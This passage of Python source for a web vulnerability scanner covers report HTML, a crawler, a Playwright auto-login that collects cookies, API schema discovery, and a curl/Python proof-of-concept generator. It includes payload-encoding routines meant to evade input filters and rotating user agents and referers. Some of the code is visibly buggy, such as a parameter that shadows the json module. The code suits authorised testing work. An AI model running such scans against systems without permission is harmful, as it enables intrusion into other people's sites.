                        <h3>Detected Technologies ({len(self.detected_technologies)})</h3>
                        <ul class="info-list">{tech_html}</ul>
                        <h3>Crawled URLs ({len(self.crawled_urls)})</h3>
                        <ul class="info-list">{crawled_urls_html}</ul>
                        <h3>Discovered Parameters</h3>
                        {''.join(params_html)}
                        <h3>Discovered API Endpoints ({len(self.api_endpoints_discovered)})</h3>
                        <ul class="info-list">{api_endpoints_html}</ul>
                        <h3>JavaScript Files Found ({len(self.js_files_found)})</h3>
                        <ul class="info-list">{js_files_html}</ul>
                        <h3>Sensitive Data in Client-Side Storage ({len(self.sensitive_client_storage_data)})</h3>
                        <ul class="info-list">{'\n'.join(sensitive_storage_html)}</ul>
                        <h3>Scan Errors ({len(self.errors)})</h3>
                        <ul class="info-list">{errors_html}</ul>
                    </div>
                </section>
                <div class="disclaimer">
                    <p>This tool is intended for educational purposes and for use ONLY on systems where you have explicit, written authorization from the system owner to conduct security testing. Unauthorized scanning and testing of web applications is illegal and unethical. The user assumes all responsibility and liability for any actions taken using this tool. The author and AI assistant are not responsible for any misuse or damage caused by this tool. Always operate responsibly, ethically, and legally. USE WITH EXTREME CAUTION.</p>
                </div>
            </div>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <script>
                function toggleVisibility(id) {{
                    const element = document.getElementById(id);
                    const icon = element.previousElementSibling.querySelector('.toggle-icon');
                    if (element.style.display === 'block') {{
                        element.style.display = 'none';
                        icon.style.transform = 'rotate(0deg)';
                    }} else {{
                        element.style.display = 'block';
                        icon.style.transform = 'rotate(180deg)';
                    }}
                }}
                function copyToClipboard(button, elementId) {{
                    const textToCopy = document.getElementById(elementId).textContent;
                    navigator.clipboard.writeText(textToCopy).then(() => {{
                        button.textContent = 'Copied!';
                        setTimeout(() => {{ button.textContent = 'Copy'; }}, 2000);
                    }}, (err) => {{
                        console.error('Could not copy text: ', err);
                        button.textContent = 'Failed!';
                    }});
                }}
                function openPocTab(evt, tabName) {{
                    const parent = evt.target.closest('.finding-details');
                    parent.querySelectorAll('.tab-content').forEach(tc => tc.style.display = 'none');
                    parent.querySelectorAll('.tab-link').forEach(tl => tl.classList.remove('active'));
                    document.getElementById(tabName).style.display = 'block';
                    evt.currentTarget.classList.add('active');
                }}
                let currentFilterSeverity = 'All';
                let currentSearchTerm = '';
                function filterFindings() {{
                    currentSearchTerm = document.getElementById('filterInput').value.toLowerCase();
                    applyFilters();
                }}
                function filterSeverity(severity, button) {{
                    currentFilterSeverity = severity;
                    document.querySelectorAll('.filter-buttons button').forEach(btn => btn.classList.remove('active'));
                    button.classList.add('active');
                    applyFilters();
                }}
                function applyFilters() {{
                    document.querySelectorAll('.finding').forEach(finding => {{
                        const matchesSearch = finding.dataset.searchTerms.includes(currentSearchTerm);
                        const matchesSeverity = currentFilterSeverity === 'All' || finding.dataset.severity === currentFilterSeverity;
                        finding.style.display = (matchesSearch && matchesSeverity) ? 'block' : 'none';
                    }});
                }}
                document.addEventListener('DOMContentLoaded', () => {{
                    const ctx = document.getElementById('severityChart').getContext('2d');
                    new Chart(ctx, {{
                        type: 'doughnut',
                        data: {{
                            labels: ['Critical', 'High', 'Medium', 'Low', 'Informational'],
                            datasets: [{{
                                label: 'Vulnerabilities',
                                data: [{severity_counts.get('Critical', 0)}, {severity_counts.get('High', 0)}, {severity_counts.get('Medium', 0)}, {severity_counts.get('Low', 0)}, {severity_counts.get('Informational', 0)}],
                                backgroundColor: ['var(--critical)', 'var(--high)', 'var(--medium)', 'var(--low)', 'var(--info)'],
                                borderColor: 'var(--bg-card)',
                                borderWidth: 4,
                            }}]
                        }},
                        options: {{
                            responsive: true, maintainAspectRatio: false,
                            plugins: {{ legend: {{ position: 'right', labels: {{ color: 'var(--text-main)' }} }} }}
                        }}
                    }});
                    // Initialize first tab content
                    document.querySelectorAll('.finding-details').forEach(detail => {{
                        const firstTabButton = detail.querySelector('.tab-link');
                        if (firstTabButton) {{
                            firstTabButton.click();
                        }}
                    }});
                    applyFilters(); // Apply initial filters
                }});
            </script>
        </body>
        </html>
        """
        return html

    def save_reports(self):
        """Saves the HTML report to the configured downloads folder."""
        if not os.path.exists(DOWNLOADS_FOLDER):
            try:
                os.makedirs(DOWNLOADS_FOLDER)
            except OSError as e:
                logger.error(f"Could not create downloads folder '{DOWNLOADS_FOLDER}': {e}.")
                return

        domain_name = urlparse(self.target_url).netloc.replace(":", "_").replace("/", "_")
        ts = time.strftime("%Y%m%d_%H%M%S")
        html_fp = os.path.join(DOWNLOADS_FOLDER, f"machine_gun_report_{domain_name}_{ts}.html") # Updated report name
        try:
            with open(html_fp, "w", encoding="utf-8") as f:
                f.write(self.generate_html_report())
            logger.info(AnsiColors.colorize(f"HTML report saved to: {html_fp}", AnsiColors.OKGREEN))

            # Save screenshots if any
            for finding in self.findings:
                if finding['screenshot_path'] != "N/A":
                    # Assuming screenshot_path is an absolute path, copy it to report directory
                    src_path = finding['screenshot_path']
                    dest_path = os.path.join(DOWNLOADS_FOLDER, os.path.basename(src_path))
                    try:
                        import shutil
                        shutil.copy(src_path, dest_path)
                        logger.info(f"Screenshot copied to: {dest_path}")
                    except Exception as e:
                        logger.error(f"Failed to copy screenshot {src_path} to {dest_path}: {e}")

        except IOError as e:
            self.add_error(f"Failed to save HTML report to {html_fp}: {e}", check_name="ReportSave")

# --- Scanner Utilities & Core Logic ---

def _apply_payload_encodings(payload: str) -> Set[str]:
    """Applies a variety of encodings to a payload string."""
    encoded = {payload}
    # URL Encoding (single and double)
    encoded.add(quote(payload, safe=''))
    encoded.add(quote(quote(payload, safe=''), safe=''))
    # HTML Entity Encoding
    encoded.add(escape(payload))
    # Base64
    try:
        encoded.add(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
    except Exception:
        pass # Handle encoding errors gracefully
    # Case variations
    encoded.add(payload.swapcase())
    encoded.add("".join(random.choice([c.lower(), c.upper()]) for c in payload))
    # Unicode escape (JS context)
    encoded.add("".join(f"\\u{ord(char):04x}" if char.isalnum() else char for char in payload))
    return encoded

def normalize_url(url_str: str, base_for_relative: Optional[str] = None) -> Optional[str]:
    """Normalizes a URL string, resolving relative paths and cleaning components."""
    try:
        joined_url = urljoin(base_for_relative or "", url_str.strip())
        parsed = urlparse(joined_url)
        if not parsed.scheme or parsed.scheme not in ["http", "https"]: return None
        if not parsed.netloc: return None
        # Reconstruct URL without fragment, with lowercase scheme/host, and sorted query params
        path = parsed.path or "/"
        # Sort query parameters for consistent URL normalization
        query_params = parse_qs(parsed.query)
        sorted_query = urlencode(sorted([(k, v[0]) for k, v in query_params.items()]), doseq=True)
        return parsed._replace(scheme=parsed.scheme.lower(), netloc=parsed.netloc.lower(), path=path, query=sorted_query, fragment="").geturl()
    except Exception as e:
        logger.debug(f"URL normalization failed for '{url_str}': {e}")
        return None

def generate_poc(url: str, method: str, headers: Dict[str, str], data: Any, raw_req: str) -> Tuple[str, str, str]:
    """Generates curl, python, and manual PoC snippets."""
    # Curl PoC
    curl_cmd = f"curl -ik -X {method} '{url}'"
    for h, v in headers.items():
        curl_cmd += f" -H '{h}: {v}'"
    if data:
        data_str = json.dumps(data) if isinstance(data, dict) else str(data)
        curl_cmd += f" --data-raw $'{data_str.replace('\'', '\'\\\'\'')}'" # Escape single quotes for shell
    
    # Python PoC
    python_data_param = ""
    if data:
        if isinstance(data, dict):
            python_data_param = f", json={json.dumps(data, indent=4)}"
        else:
            python_data_param = f", data='''{str(data).replace('\'', '\\\'')}'''" # Escape for multiline string
    
    python_headers_dict = json.dumps(headers, indent=4).replace("\n", "\n    ") # Indent for readability
    
    python_poc = f"""import asyncio
import aiohttp
import json

async def reproduce():
    url = '{url}'
    headers = {python_headers_dict}
    
    async with aiohttp.ClientSession() as session:
        async with session.request('{method}', url, headers=headers, ssl=False{python_data_param}) as response:
            print(f"Status: {{response.status}}")
            print("--- Response Headers ---")
            for k, v in response.headers.items():
                print(f"    {{k}}: {{v}}")
            print("--- Response Body ---")
            print(await response.text())

if __name__ == "__main__":
    asyncio.run(reproduce())
"""
    # Manual PoC
    manual_poc = f"""1. Target URL: {url}
2. HTTP Method: {method}
3. Headers:
{json.dumps(headers, indent=2)}
4. Body/Data:
{json.dumps(data, indent=2) if data else 'N/A'}
5. Send the request and observe the response for the described vulnerability.
"""
    return curl_cmd, python_poc, manual_poc
async def fetch_url(
    session: aiohttp.ClientSession,
    concurrency_manager: Optional[AdaptiveConcurrencyManager], # Make it optional
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, Any]] = None,
    data: Optional[Union[Dict[str, Any], bytes]] = None,
    json: Optional[Dict[str, Any]] = None,
    headers: Optional[Dict[str, str]] = None,
    allow_redirects: bool = True,
    proxy: Optional[str] = None
) -> Tuple[Optional[aiohttp.ClientResponse], Optional[str], Optional[Dict[str, str]], Optional[str], Optional[float], Optional[str]]:
    """
    Fetches a URL using aiohttp, handling concurrency, errors, and basic request details.
    Returns response object, content, headers, final URL, duration, and raw request string.
    """
    start_time = time.monotonic()
    content = None
    resp = None
    final_url = None
    raw_req_str = ""

    # Generate a unique request ID for logging
    request_id = str(uuid.uuid4())[:8]

    # Use default headers if none provided, but allow overriding
    request_headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": random.choice(REFERERS)
    }
    if headers:
        request_headers.update(headers)

    # Convert data dict to JSON string if json is provided
    if json is not None:
        data = json.dumps(json).encode('utf-8')
        request_headers['Content-Type'] = 'application/json'
    elif isinstance(data, dict):
        # Default to form-urlencoded if data is dict and no specific Content-Type
        if 'Content-Type' not in request_headers:
            request_headers['Content-Type'] = 'application/x-www-form-urlencoded'

    is_error = False
    try:
        # Acquire semaphore only if concurrency_manager is provided
        if concurrency_manager:
            await concurrency_manager.acquire()

        logger.debug(f"[{request_id}] Sending {method} request to {url} with params: {params}, data: {data}, headers: {request_headers}")

        async with session.request(
            method,
            url,
            params=params,
            data=data,
            headers=request_headers,
            allow_redirects=allow_redirects,
            proxy=proxy
        ) as response:
            resp = response
            final_url = str(response.url)
            content = await response.text(errors='ignore') # Use errors='ignore' for robust decoding
            
            # Construct raw request string for POC generation
            raw_req_str = f"{method} {urlparse(url).path}?{urlencode(params) if params else ''} HTTP/1.1\n"
            for k, v in request_headers.items():
                raw_req_str += f"{k}: {v}\n"
            raw_req_str += "\n"
            if data and isinstance(data, bytes):
                raw_req_str += data.decode('utf-8', errors='ignore')
            elif data and isinstance(data, dict):
                raw_req_str += urlencode(data)

            logger.debug(f"[{request_id}] Received response from {final_url} Status: {resp.status} Length: {len(content)} in {time.monotonic() - start_time:.2f}s")

    except aiohttp.ClientError as e:
        logger.error(f"[{request_id}] HTTP client error for {url}: {e}")
        is_error = True
    except asyncio.TimeoutError:
        logger.error(f"[{request_id}] Request to {url} timed out after {session.timeout.total} seconds.")
        is_error = True
    except Exception as e:
        logger.critical(f"[{request_id}] Unexpected error fetching {url}: {e}", exc_info=True)
        is_error = True
    finally:
        duration = time.monotonic() - start_time
        # Release semaphore and update metrics only if concurrency_manager is provided
        if concurrency_manager:
            concurrency_manager.release()
            await concurrency_manager.update_metrics(duration, is_error)

    return resp, content, dict(resp.headers) if resp else None, final_url, duration, raw_req_str

def _calculate_structural_hash(html_content: str) -> int:
    """Calculates a hash based on the HTML tag structure and depth."""
    tags_with_depth = []
    depth = 0
    # Use BeautifulSoup for more robust structural parsing
    soup = BeautifulSoup(html_content, 'lxml')
    for element in soup.find_all(True): # Find all tags
        # Simple heuristic for depth (not perfect, but good enough for structural hash)
        current_depth = len(list(element.parents))
        tags_with_depth.append(f"{element.name}{current_depth}")
    return hash("".join(sorted(tags_with_depth)))

async def build_behavioral_baseline(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, proxy: Optional[str]):
    """Builds a detailed behavioral baseline for a given URL to aid in anomaly detection."""
    url_key = normalize_url(url)
    if not url_key or url_key in report.baseline_profiles:
        return

    logger.debug(f"Building behavioral baseline for: {url_key}")
    response_times = []
    content_lengths = []
    status_codes = []
    structural_hashes = set()

    # Fetch the URL multiple times to get a stable baseline
    for _ in range(BASELINE_SAMPLES):
        resp, content, _, _, duration, _ = await fetch_url(session, concurrency_manager, url_key, proxy=proxy)
        if resp and content is not None and duration is not None:
            response_times.append(duration)
            content_lengths.append(len(content))
            status_codes.append(resp.status)
            structural_hashes.add(_calculate_structural_hash(content))
        await asyncio.sleep(0.05) # Small delay between baseline requests

    if not response_times:
        report.add_error(f"Could not build behavioral baseline for {url_key}", url_key, "BaselineBuilder")
        return

    report.baseline_profiles[url_key] = {
        "mean_time": statistics.mean(response_times),
        "stdev_time": statistics.stdev(response_times) if len(response_times) > 1 else 0,
        "mean_length": statistics.mean(content_lengths),
        "stdev_length": statistics.stdev(content_lengths) if len(content_lengths) > 1 else 0,
        "common_statuses": Counter(status_codes),
        "structural_hashes": structural_hashes,
    }
    logger.info(f"Baseline for {url_key} established: "
                f"Time={report.baseline_profiles[url_key]['mean_time']:.3f}s, "
                f"Length={report.baseline_profiles[url_key]['mean_length']:.0f}b")

def is_response_anomalous(report: ScanReport, url: str, response: aiohttp.ClientResponse, content: str, duration: float) -> bool:
    """Checks if a response deviates significantly from its established baseline."""
    url_key = normalize_url(url)
    baseline = report.baseline_profiles.get(url_key)
    if not baseline:
        logger.warning(f"No baseline for {url_key}, cannot check for anomaly. This should ideally not happen if baselines are built pre-scan.")
        return False # No baseline to compare against

    # Define a small buffer for standard deviation to prevent zero-range issues
    MIN_STDEV_BUFFER_TIME = 0.1 # seconds
    MIN_STDEV_BUFFER_LENGTH = 150 # bytes

    # Time-based anomaly (more than X standard deviations + a constant buffer)
    # Use max(stdev, MIN_STDEV_BUFFER_TIME) to ensure a minimum range
    time_threshold = baseline['mean_time'] + 3 * max(baseline['stdev_time'], MIN_STDEV_BUFFER_TIME)
    if duration > time_threshold:
        logger.debug(f"Anomaly detected for {url}: Time deviation ({duration:.3f}s > {time_threshold:.3f}s)")
        return True

    # Content-length anomaly (outside 3 standard deviations)
    # Use max(stdev, MIN_STDEV_BUFFER_LENGTH) to ensure a minimum range
    stdev_length_effective = max(baseline['stdev_length'], MIN_STDEV_BUFFER_LENGTH)
    len_threshold_low = baseline['mean_length'] - 3 * stdev_length_effective
    len_threshold_high = baseline['mean_length'] + 3 * stdev_length_effective
    
    # Ensure thresholds don't go negative for length
    len_threshold_low = max(0, len_threshold_low)

    if not (len_threshold_low <= len(content) <= len_threshold_high):
        logger.debug(f"Anomaly detected for {url}: Length deviation ({len(content)}b not in range [{len_threshold_low:.0f}, {len_threshold_high:.0f}])")
        return True

    # Status code anomaly (if not among common statuses) - consider top 2 common statuses
    most_common_statuses = [status for status, count in baseline['common_statuses'].most_common(2)]
    if response.status not in most_common_statuses:
        logger.debug(f"Anomaly detected for {url}: Status code deviation ({response.status})")
        return True

    # Structural anomaly (if structural hash is new)
    if _calculate_structural_hash(content) not in baseline['structural_hashes']:
        logger.debug(f"Anomaly detected for {url}: Structural hash deviation")
        return True

    return False
# --- Crawling and Discovery (Enhanced with Playwright and API Discovery) ---

async def login_with_playwright(browser: Browser, login_url: str, username: str, password: str, report: ScanReport, cli_args: argparse.Namespace) -> bool:
    """
    Performs a login sequence using Playwright to obtain session cookies/headers.
    Stores these in the report object for subsequent aiohttp requests.
    """
    logger.info(f"Attempting Playwright login to {login_url} with username '{username}'...")
    page: Optional[Page] = None
    try:
        page = await browser.new_page()
        await page.goto(login_url, wait_until="domcontentloaded", timeout=PLAYWRIGHT_TIMEOUT)

        # Heuristic to find username and password fields
        username_field = await page.locator('input[type="text"], input[type="email"], input[name*="user"], input[id*="user"]').first.fill(username)
        password_field = await page.locator('input[type="password"], input[name*="pass"], input[id*="pass"]').first.fill(password)

        # Try to find a login button and click it
        login_button = await page.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Sign In"), a:has-text("Login")').first
        await login_button.click()

        # Wait for navigation or a common post-login element
        await page.wait_for_load_state("networkidle", timeout=PLAYWRIGHT_TIMEOUT)

        # Check for successful login (e.g., redirect to dashboard, presence of logout link)
        current_url = page.url
        if current_url == login_url or "login" in current_url.lower() or "auth" in current_url.lower():
            logger.warning(f"Playwright login to {login_url} might have failed or stayed on login page.")
            # Check for error messages
            error_message = await page.locator('text=invalid credentials, text=Incorrect, text=failed').all_text_contents()
            if error_message:
                logger.error(f"Login page showed error message: {', '.join(error_message)}")
                return False
        
        # Extract cookies
        cookies = await page.context.cookies()
        for cookie in cookies:
            report.session_cookies[cookie['name']] = cookie['value']
        
        # Extract common authorization headers if present after login (e.g., Authorization: Bearer token)
        # This is tricky with Playwright as it doesn't expose request headers of subsequent requests directly
        # One way is to intercept requests, but for simplicity, we'll assume cookies are primary for now.
        # If token is in response body, it needs to be parsed from page.content()
        
        logger.info(f"Playwright login successful. Extracted {len(report.session_cookies)} cookies.")
        return True

    except PlaywrightTimeoutError:
        logger.error(f"Playwright login timed out for {login_url}. Check URL or credentials.")
        return False
    except PlaywrightError as e:
        logger.error(f"Playwright error during login to {login_url}: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error during Playwright login to {login_url}: {e}")
        return False
    finally:
        if page:
            await page.close()


async def crawl_and_discover(session: aiohttp.ClientSession, browser: Optional[Browser], report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, start_url: str, max_depth: int, max_urls: int, cli_args: argparse.Namespace):
    """
    Recursively crawls the target website to discover URLs, forms, JavaScript files, and parameters.
    Respects crawl depth, URL limits, and exclusion patterns. Builds behavioral baselines.
    Now also uses a headless browser for dynamic content and API discovery.
    """
    logger.info(f"Starting crawl from {start_url} (depth: {max_depth}, max URLs: {max_urls})")
    queue: Deque[Tuple[str, int]] = deque([(start_url, 0)])
    report.queued_or_processed_urls.add(start_url)
    target_netloc = urlparse(start_url).netloc

    # Create a single Playwright page for crawling/DOM XSS
    page: Optional[Page] = None
    
    # Only attempt to create a page if browser is not None
    if browser:
        try:
            page = await browser.new_page()
            # Set headers for Playwright requests, including session cookies/headers if logged in
            headers_for_playwright = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
            headers_for_playwright["Referer"] = random.choice(REFERERS)
            
            # Apply session cookies from login
            if report.session_cookies:
                cookie_str = "; ".join([f"{k}={v}" for k, v in report.session_cookies.items()])
                headers_for_playwright['Cookie'] = cookie_str
            # Apply session headers from login (if any were captured/set)
            if report.session_headers:
                headers_for_playwright.update(report.session_headers)

            # Apply CLI auth headers (CLI takes precedence or merges)
            if cli_args.auth_cookie: headers_for_playwright['Cookie'] = cli_args.auth_cookie
            if cli_args.auth_header:
                try:
                    key, val = cli_args.auth_header.split(':', 1)
                    headers_for_playwright[key.strip()] = val.strip()
                except ValueError:
                    logger.error(f"Invalid --auth-header format: '{cli_args.auth_header}'. Expected 'Key: Value'.")
            
            await page.set_extra_http_headers(headers_for_playwright)

        except PlaywrightError as e:
            logger.error(f"Failed to launch Playwright page for crawling: {e}. Dynamic crawling and DOM XSS checks will be skipped.")
            page = None # Disable browser-based features
    else:
        logger.info("Browser-based crawling and DOM XSS checks skipped as Playwright browser was not launched.")


    while queue:
        current_url, depth = queue.popleft()

        if depth > max_depth:
            logger.debug(f"Skipping {current_url}: Max depth ({max_depth}) reached.")
            continue
        if len(report.crawled_urls) >= max_urls:
            logger.debug(f"Skipping {current_url}: Max URLs to scan ({max_urls}) reached.")
            continue
        
        if cli_args.exclude_url_pattern and re.search(cli_args.exclude_url_pattern, current_url, re.I):
            logger.debug(f"Skipping excluded URL: {current_url}")
            continue

        logger.info(f"Crawling: {current_url} (Depth: {depth})")
        
        content = None
        headers = None
        final_url = None
        resp = None

        # Apply session cookies/headers to aiohttp session
        aiohttp_headers = {}
        if report.session_cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in report.session_cookies.items()])
            aiohttp_headers['Cookie'] = cookie_str
        if report.session_headers:
            aiohttp_headers.update(report.session_headers)
        
        # CLI auth headers take precedence or merge
        if cli_args.auth_cookie: aiohttp_headers['Cookie'] = cli_args.auth_cookie
        if cli_args.auth_header:
            try:
                key, val = cli_args.auth_header.split(':', 1)
                aiohttp_headers[key.strip()] = val.strip()
            except ValueError:
                logger.error(f"Invalid --auth-header format: '{cli_args.auth_header}'. Expected 'Key: Value'.")

        # Attempt to fetch with aiohttp first (faster for static content)
        resp, content, headers, final_url, _, _ = await fetch_url(session, concurrency_manager, current_url, allow_redirects=True, proxy=cli_args.proxy, headers=aiohttp_headers)
        final_url = normalize_url(final_url or current_url)

        # If aiohttp fails or content is empty, try with Playwright for dynamic content
        if (not resp or content is None or not final_url) and page: # Only use page if it was successfully created
            logger.debug(f"Aiohttp failed or returned empty content for {current_url}. Trying with Playwright.")
            try:
                await page.goto(current_url, wait_until="networkidle", timeout=PLAYWRIGHT_TIMEOUT)
                content = await page.content()
                resp_pw = await page.request.get(current_url) # Get response details from Playwright
                headers = resp_pw.headers
                final_url = page.url
                logger.info(f"Successfully fetched {current_url} with Playwright.")
            except PlaywrightError as e:
                logger.error(f"Playwright failed to fetch {current_url}: {e}")
                report.add_error(f"Playwright fetch error: {e}", current_url, "Crawler (Playwright)")
                content = None # Ensure content is None if Playwright fails
        
        if content is None or not final_url:
            report.add_error(f"Failed to fetch content for crawling: {current_url}", current_url, "Crawler")
            continue
        
        # Deduplication based on content hash
        content_hash = hashlib.sha256(content.encode('utf-8', errors='ignore')).hexdigest()
        if content_hash in report.response_hashes:
            logger.debug(f"Skipping URL with duplicate content: {current_url} (duplicate of {report.response_hashes[content_hash]})")
            report.crawled_urls.add(final_url) # Still add to crawled_urls if it's a new URL
            continue
        report.response_hashes[content_hash] = current_url
        
        report.crawled_urls.add(final_url)

        # Build behavioral baseline for the new, unique page
        if resp: # Only build baseline if aiohttp response was successful
            # This baseline is built during crawl, but the main baseline building phase will re-verify/ensure all are built.
            await build_behavioral_baseline(session, report, concurrency_manager, final_url, cli_args.proxy)

        # Detect technologies
        detect_technologies(headers or {}, content, final_url, report)

        # Extract links, JS files, and parameters
        extract_from_content(content, final_url, report)

        # Extract API Endpoints (new feature)
        await extract_api_endpoints(session, page, content, final_url, report, cli_args)

        # Add newly discovered links/JS files to queue if they belong to target domain
        for link in list(report.crawled_urls): # Iterate over a copy as set might change
            if link not in report.queued_or_processed_urls and urlparse(link).netloc == target_netloc:
                report.queued_or_processed_urls.add(link)
                queue.append((link, depth + 1))
        
        for js_file in list(report.js_files_found):
            if js_file not in report.queued_or_processed_urls and urlparse(js_file).netloc == target_netloc:
                report.queued_or_processed_urls.add(js_file)
                # For JS files, we might want to fetch and extract content too
                # This is already handled by check_info_disclosure_js, so no need to re-fetch here for content extraction
                # just ensure it's in the queue for later processing if it's a new URL.
                pass
    
    if page: # Only close page if it was successfully created
        await page.close() # Close the Playwright page after crawling

async def extract_api_endpoints(session: aiohttp.ClientSession, page: Optional[Page], content: str, current_url: str, report: ScanReport, cli_args: argparse.Namespace):
    """
    Extracts potential API endpoints from JavaScript files and other content.
    Also looks for OpenAPI/Swagger/GraphQL schemas.
    """
    parsed_url = urlparse(current_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

    # Regex for common API path patterns
    api_path_patterns = [
        re.compile(r'/(api|rest|v\d+)/[a-zA-Z0-9_/-]+', re.I),
        re.compile(r'/(graphql|rpc|jsonrpc)', re.I),
    ]

    # Look for API endpoints in the current page content
    for pattern in api_path_patterns:
        for match in pattern.finditer(content):
            path = match.group(0)
            full_api_url = urljoin(base_url, path)
            if urlparse(full_api_url).netloc == parsed_url.netloc: # Ensure it's on the same domain
                report.api_endpoints_discovered.add(normalize_url(full_api_url) or full_api_url)

    # Look for common API schema files
    common_schema_paths = [
        "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
        "/v1/swagger.json", "/v2/swagger.json", "/v3/api-docs", "/api/swagger.json",
        "/graphql", "/graphql/v1",
    ]
    for schema_path in common_schema_paths:
        schema_url = urljoin(base_url, schema_path)
        if schema_url not in report.queued_or_processed_urls: # Avoid re-fetching if already processed
            report.queued_or_processed_urls.add(schema_url)
            # Try fetching the schema to confirm existence
            resp, schema_content, _, _, _, _ = await fetch_url(session, None, schema_url, proxy=cli_args.proxy) # No concurrency manager for this specific fetch
            if resp and resp.status == 200 and schema_content:
                report.api_endpoints_discovered.add(normalize_url(schema_url) or schema_url)
                logger.info(f"Discovered API schema/endpoint: {schema_url}")
                # If it's a GraphQL endpoint, add it for specific GraphQL checks later
                if "graphql" in schema_url:
                    report.detected_technologies.add("GraphQL")
                # If it's OpenAPI/Swagger, try to parse it to find more endpoints
                if "swagger" in schema_url or "openapi" in schema_url:
                    report.detected_technologies.add("OpenAPI/Swagger")
                    try:
                        schema_data = json.loads(schema_content)
                        if "paths" in schema_data:
                            for path, methods in schema_data["paths"].items():
                                for method in methods:
                                    full_api_url_from_schema = urljoin(base_url, path)
                                    report.api_endpoints_discovered.add(normalize_url(full_api_url_from_schema) or full_api_url_from_schema)
                                    logger.debug(f"Discovered API endpoint from schema: {method.upper()} {full_api_url_from_schema}")
                    except json.JSONDecodeError:
                        logger.debug(f"Could not parse API schema from {schema_url} as JSON.")
                    except Exception as e:
                        logger.error(f"Error parsing API schema from {schema_url}: {e}")

    # Analyze JS files for API calls (more detailed than just paths)
    for js_file_url in report.js_files_found:
        if js_file_url not in report.browser_pages_scanned and page: # Check if Playwright page is available and not already scanned
            try:
                # Use Playwright to load the JS file context and find API calls
                await page.goto(js_file_url, wait_until="load", timeout=PLAYWRIGHT_TIMEOUT)
                js_content = await page.content() # Get the JS content
                
                # Regex for common API call patterns in JS
                # This is a simplified example; a full parser would be more robust.
                js_api_patterns = [
                    re.compile(r'(?:fetch|axios|XMLHttpRequest|jQuery\.ajax)\(["\']?([^"\']+)["\']?', re.I),
                    re.compile(r'(?:GET|POST|PUT|DELETE|PATCH)\(["\']?([^"\']+)["\']?', re.I),
                    re.compile(r'url:\s*["\']([^"\']+)["\']', re.I),
                ]
                for pattern in js_api_patterns:
                    for match in pattern.finditer(js_content):
                        api_path = match.group(1)
                        # Basic filtering to ensure it's a relative path or same domain
                        if api_path.startswith('/') or urlparse(api_path).netloc == parsed_url.netloc:
                            full_api_url = urljoin(base_url, api_path)
                            report.api_endpoints_discovered.add(normalize_url(full_api_url) or full_api_url)
                            logger.debug(f"Discovered API endpoint from JS: {full_api_url}")
                
                report.browser_pages_scanned.add(js_file_url) # Mark as scanned by browser

            except PlaywrightError as e:
                logger.debug(f"Playwright failed to analyze JS file {js_file_url} for API endpoints: {e}")
            except Exception as e:
                logger.error(f"Error analyzing JS file {js_file_url} for API endpoints: {e}")


def extract_from_content(content: str, base_url: str, report: ScanReport):
    """
    Extracts links, forms, JavaScript files, and parameters from HTML content.
    Updated to also extract potential API paths.
    """
    soup = BeautifulSoup(content, 'lxml')
    parsed_base = urlparse(base_url)
    target_netloc = parsed_base.netloc

    # Extract links (a, link, script src, img src, etc.)
    for tag in soup.find_all(['a', 'link', 'script', 'img', 'iframe', 'source', 'track', 'embed']):
        for attr in ['href', 'src']:
            link = tag.get(attr)
            if link:
                full_url = normalize_url(link, base_url)
                if full_url and urlparse(full_url).netloc == target_netloc:
                    if full_url not in report.crawled_urls:
                        report.crawled_urls.add(full_url)
                        if tag.name == 'script' and full_url.endswith('.js'):
                            report.js_files_found.add(full_url)
                        logger.debug(f"Discovered URL: {full_url}")

    # Extract forms and their parameters
    for form in soup.find_all('form'):
        form_action = form.get('action')
        form_method = form.get('method', 'GET').upper()
        form_url = normalize_url(form_action, base_url) if form_action else base_url
        
        if form_url and urlparse(form_url).netloc == target_netloc:
            if form_url not in report.parameters_discovered:
                report.parameters_discovered[form_url] = []

            for input_tag in form.find_all(['input', 'textarea', 'select']):
                param_name = input_tag.get('name')
                param_value = input_tag.get('value', '') # Default value
                param_type = input_tag.get('type', 'text') # Input type
                if param_name:
                    report.parameters_discovered[form_url].append({
                        "name": param_name,
                        "source": "form",
                        "method": form_method,
                        "value": param_value,
                        "type": param_type
                    })
                    logger.debug(f"Discovered Form Parameter: {form_url} -> {param_name}")
            
            # Extract CSRF tokens from forms (hidden inputs)
            for hidden_input in form.find_all('input', {'type': 'hidden'}):
                name = hidden_input.get('name', '').lower()
                value = hidden_input.get('value')
                if value and ("csrf" in name or "token" in name):
                    report.anti_csrf_tokens[form_url] = value
                    logger.debug(f"Discovered CSRF token for {form_url}: {name}={value[:10]}...")

    # Extract parameters from URLs (query strings)
    for url in list(report.crawled_urls): # Iterate over a copy as set might change
        parsed_url = urlparse(url)
        if parsed_url.query:
            query_params = parse_qs(parsed_url.query)
            clean_url = parsed_url._replace(query="").geturl()
            if clean_url not in report.parameters_discovered:
                report.parameters_discovered[clean_url] = []
            for name, values in query_params.items():
                # Add only if not already present from a form with the same name
                if not any(p['name'] == name and p['source'] == 'form' for p in report.parameters_discovered[clean_url]):
                    report.parameters_discovered[clean_url].append({
                        "name": name,
                        "source": "url_query",
                        "method": "GET", # Query params are typically GET
                        "value": values[0] if values else "",
                        "type": "string" # Default type
                    })
                    logger.debug(f"Discovered URL Parameter: {clean_url} -> {name}")

    # Extract parameters from POST bodies (if any were captured during crawl, though this is harder without interception)
    # This would typically require a proxy or browser interception, which is beyond simple content parsing.
    # For now, we rely on form inputs and URL queries.

def detect_technologies(headers: Dict[str, str], content: str, url: str, report: ScanReport):
    """Detects web technologies based on headers and page content."""
    for tech, patterns in TECHNOLOGY_FINGERPRINTS.items():
        if tech in report.detected_technologies: continue # Already detected

        # Check headers
